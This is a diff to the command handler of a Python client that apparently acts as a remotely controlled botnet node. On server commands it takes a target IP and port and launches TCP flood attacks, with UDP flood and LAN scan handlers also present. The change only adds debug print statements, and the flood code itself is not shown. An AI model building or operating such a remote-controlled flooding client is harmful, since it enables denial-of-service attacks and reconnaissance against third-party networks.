@@ -118,17 +118,23 @@ class Client(object):
             
         elif self.in_data == "TCPFloodAttack":
 
+            print("Getting IP")
             self.resetServerMessage()
             self.targetIP = self.in_data
 
+            print("Getting Port")
             self.resetServerMessage()
             self.targetPort = int(self.in_data)
 
+            print("Sending Info")
             self.client.send(pickle.dumps("Target IP: "+self.targetIP
                                           +" Target Port: "+ str(self.targetPort)
                                           +" TCP Flood Attack"))
 
+            print("Running Method")
             self.tcpAttack.sendTCPPackets(self.targetIP, self.targetPort)
+
+            print("Sending Info")
 
         elif self.in_data == "UDPFloodAttack":
 
@@ -167,14 +173,18 @@ class Client(object):
 
         elif self.in_data == "NodeLANScan":
 
+            print("Getting IP")
             self.resetServerMessage()
             self.targetIP = self.in_data
 
+            print("Getting Port")
             self.resetServerMessage()
             self.targetPort = int(self.in_data)
 
+            print("Running Method")
             self.nodeLANScan.LANScan(self.seekerIP)
 
+            print("Sending Info")
             self.client.send(pickle.dumps(self.nodeLANScan.hostList))
 
     #Prints List Messages From Server
